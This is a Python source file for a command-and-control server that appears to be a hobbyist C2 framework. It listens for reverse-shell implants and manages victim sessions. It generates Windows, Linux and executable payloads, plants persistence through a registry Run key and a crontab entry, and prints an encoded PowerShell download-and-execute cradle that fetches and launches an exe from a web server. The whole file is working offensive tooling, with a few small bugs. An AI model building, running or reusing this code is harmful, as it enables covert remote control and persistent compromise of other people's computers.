import shutil
import socket
import random
import string
import threading
import time
from datetime import datetime
from prettytable import PrettyTable
import os
import os.path
import subprocess
import base64
def banner():
    print("""
   ___ ___  _ __ ___  _ __ ___   __ _ _ __   __| |
  / __/ _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |
 | (_| (_) | | | | | | | | | | | (_| | | | | (_| |
  \___\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|
  
  _________________________________________________
  Menu Commands
  _________________________________________________
  
  listeners -g            -> Generate a New Listener
  winplant py             -> Generate a Window Compatible python payload
  linplant py             -> Generate a Linux Compatible python payload 
  exeplant                -> Generate a Executeble Payload for Windows
  sessions -1             -> List Sessions
  sessions -i <val>       -> Enter a new sessions
  kill <val>              -> Kills an Active Sessions
  
  Sessions Command
  __________________________________________________
  
  background               -> Background the current sessions
  exit                     -> Terminated the current sessions                                            
     
                                                   
      """)

def help():
    print('''                                              
   ___ ___  _ __ ___  _ __ ___   __ _ _ __   __| |
  / __/ _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |
 | (_| (_) | | | | | | | | | | | (_| | | | | (_| |
  \___\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|
  
  _________________________________________________
  Menu Commands
  _________________________________________________
  
  listeners -g            -> Generate a New Listener
  winplant py             -> Generate a Window Compatible python payload
  linplant py             -> Generate a Linux Compatible python payload 
  exeplant                -> Generate a Executeble Payload for Windows
  sessions -1             -> List Sessions
  sessions -i <val>       -> Enter a new sessions
  kill <val>              -> Kills an Active Sessions
  
  Sessions Command
  __________________________________________________
  
  background               -> Background the current sessions
  exit                     -> Terminated the current sessions                                            
     
     ''')
def comm_in(targ_id):
    print('[+]awaiting response')
    message_rec = targ_id.recv(4906).decode()
    message_rec = base64.b64decode(message_rec)
    message_rec = message_rec.decode().strip()
    return message_rec

def comm_out(targ_id,message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+]awaiting client request')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def kill_sig(targ_id,message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip=sock.accept()
            username = remote_target.recv(1024).decode()
            username = base64.b64decode(username).decode()
            op_sys = remote_target.recv(4096).decode()
            op_sys = base64.b64decode(op_sys).decode()
            if 'Windows 10' in op_sys:
                pay_val = 1
            elif 'Windows 11' in op_sys:
                pay_val = 1
            elif 'Windows' in op_sys:
                pay_val = 1
            else:
                pay_val = 2
            cur_time = time.strftime("%H:%M:%S",time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}",time_record,username,op_sys,pay_val,'Active'])
                print(f'\n[+]connection received from {host_name[0]}@{remote_ip[0]}\n' + '[\033[93m*\033[0m] \033[91mBEAR >> \033[0m' ,end="")
            else:
                targets.append([remote_target,remote_ip[0],time_record,username,op_sys,pay_val,'Active'])
                print(f'\n[+]connection received from {remote_ip[0]}\n' + '[\033[93m*\033[0m] \033[91mBEAR >> \033[0m', end="")
        except:
            pass

def target_comm(targ_id, targets, num):
    while True:
        message = input(f'{targets[num][3]}/{targets[num][1]}#>')
        if len(message)==0:
            continue
        if message=='help':
            pass
        else:
            comm_out(targ_id, message)
            if message == 'exit':
                message = base64.b64encode(message.encode())
                targ_id.send(message)
                targ_id.close()
                targets[num][6] = 'Dead'
                break
            if message == 'background':
                break
            if message == 'persist':
                payload_name = input("[+]enter the name of payload to autorun: ")
                if targets[num][5] == 1:
                    persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                    persist_command_1 = base64.b64encode(persist_command_1.encode())
                    targ_id.send(persist_command_1)
                    persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                    persist_command_2 = base64.b64encode(persist_command_2.encode())
                    targ_id.send(persist_command_2)
                    print('[+]Run this command to clean up the registry: \nreg deleted\n HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v screendoor /f ')
                if targets[num][5] == 2:
                    persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                    persist_command = base64.b64encode(persist_command.encode())
                    targ_id.send(persist_command)
                    print("[+]run this command to clean up the crontab: \n crontab -r")
                print('[+]Persistence technique complete')
            else:
                response = comm_in(targ_id)
                if response == 'exit':
                    print('[-] The Client has terminated the connection')
                    targ_id.close()
                    break
                print(response)


def winplant():
    ran_name = ''.join(random.choices(string.ascii_lowercase, k=6))
    file_name = f'{ran_name}.py'
    check_cwd = os.getcwd()

    if os.path.exists(f'{check_cwd}//winplant.py'):
        shutil.copy('winplant.py', file_name)
        print(f'[+] Copied winplant.py to {file_name}')
    else:
        print('[-] winplant.py file not found')

    with open(file_name) as f:
        new_host = f.read().replace('127.0.0.1', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)

    with open(file_name) as f:
        new_port = f.read().replace('1234', str(host_port))
    with open(file_name, 'w') as f:
        f.write(new_port)

    if os.path.exists(file_name):
        print(f'[+] {file_name} saved to current directory')
    else:
        print('Error occurred during generation')

def linplant():
    ran_name = ''.join(random.choices(string.ascii_lowercase, k=6))
    file_name = f'{ran_name}.py'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}//linplant.py'):
        shutil.copy('linplant.py', file_name)
        print(f'[+] Copied linplant.py to {file_name}')
    else:
        print('[-] linplant.py file not found')

    with open(file_name) as f:
        new_host = f.read().replace('127.0.0.1', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)

    with open(file_name) as f:
        new_port = f.read().replace('1234', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)

    if os.path.exists(f'{file_name}'):
        print(f'[+] {file_name} saved to current directory')
    else:
        print('[-] Error occurred during generation')

def exeplant():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    exe_file = f'{ran_name}.exe'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}//exeplant.py'):
        shutil.copy('exeplant.py', file_name)
    else:
        print('[-]exeplant.py file not found')
    with open(file_name) as f:
        new_host = f.read().replace('127.0.0.1',host_ip)
    with open(file_name,'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('1234',host_port)
    with open(file_name,'w') as f:
        f.write(new_port)
        f.close()
    pyinstaller_exe = f'pyinstaller{file_name} -w --clean --onefile --distpath .'
    print(f'[+]compiling executable {exe_file}....')
    subprocess.call(pyinstaller_exe,stderr=subprocess.DEVNULL)
    os.remove(f'{file_name}.spec')
    shutil.rmtree('build')
    if os.path.exists(f'{check_cwd}//{exe_file}'):
        print(f'[+]{exe_file} saved to current directory')
    else:
        print('error occured during generation')

def pshell_crdle():
    web_server_ip = input('[+]Web Server listing Host: ')
    web_server_port = input('[+]Web Server Port: ')
    payload_name = input('[+] input payload name: ')
    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    runner_file = f'{runner_file}.txt'
    random_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    random_exe_file = f'{random_exe_file}.exe'
    print(f'[+]Run the following command to Start a Web Server.\npython3 -m http.server -b {web_server_ip} {web_server_port}')
    runner_call_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('utf-16le')
    with open(runner_file, 'w') as f:
        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {random_exe_file}; Start-Process -FilePath {random_exe_file}')
        f.close()
    b64_runner_cal = base64.b64encode(runner_call_unencoded)
    b64_runner_cal = b64_runner_cal.decode()
    print(f'[+] Encoded Payload \n\npowershell -e {b64_runner_cal}')
    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
    print(f'\n[+]unencoded Payload\n\n{b64_runner_cal_decoded}')

if __name__=='__main__':
    targets = []
    banner()
    listener_counter = 0
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            command = input("[\033[93m*\033[0m] \033[91mBEAR >> \033[0m")
            if command=='help':
                help()
            if command == 'listeners -g':
                host_ip = input("[+]Enter ip:")
                host_port = input("[+]enter port: ")
                listener_handler()
                listener_counter += 1
            if command=='winplant py':
                    if listener_counter > 0:
                        winplant()
                    else:
                        print('[-]You cannot generate a payload because no active user is their')
            if command == 'linplant py':
                    if listener_counter>0:
                        linplant()
                    else:
                        print('[-]You cannot generate a payload because no active user is their')
            if command=='exeplant':
                    if listener_counter > 0:
                        exeplant()
                    else:
                        print('[-]You cannot generate a payload because no active user is their')
            if command =='pshell_shell':
                pshell_crdle()
            if command.split(" ")[0] == 'sessions':
                    session_counter = 0
                    if command.split(" ")[1] == '-1':
                        mytable = PrettyTable()
                        mytable.field_names = ['Sessions', 'Username', 'Status', 'Targets', 'Admin', 'Check-In Time', 'Operating System']
                        mytable.padding_width = 3
                        for target in targets:
                            mytable.add_row([session_counter, target[3], target[6], target[1], 'target[4]', target[2], target[4]])
                            session_counter += 1
                        print(mytable)
                    if command.split(" ")[1] == '-i':
                        try:
                            num = int(command.split(" ")[2])
                            targ_id = (targets[num])[0]
                            if (targets[num])[6]=='Active':
                                target_comm(targ_id,targets,num)
                            else:
                                print('[-]You cannot interact with dead session')
                        except (IndexError,ValueError):
                            print(f'[-] Sessions {num} does not exist')
                            continue
            else:
                continue
            if command.split(" ")[0] == 'kill':
                try:
                    num = int(command.split(" ")[1])
                    targ_id = (targets[num][0])
                    if (targets[num])[6]=='Active':
                        kill_sig(targ_id,'exit')
                        targets[num][6]='Dead'
                        print(f'[+]Session {num} is terminated.')
                    else:
                        print('you cannot interact with dead sessions-')
                except (IndexError,ValueError):
                    print(f'[+]session {num} does not exist')
        except KeyboardInterrupt:
            quit_message = print("ctrl-c\n[+]Do you really want to quit?[y/n]")
            if quit_message == 'y':
                tar_length = len(targets)
                for target in targets:
                    if targets[6] == 'Dead':
                        pass
                    else:
                        comm_out(targets[0],'exit')
                kill_flag =1
                if listener_counter > 0:
                    sock.close()
                break
            else:
                continue
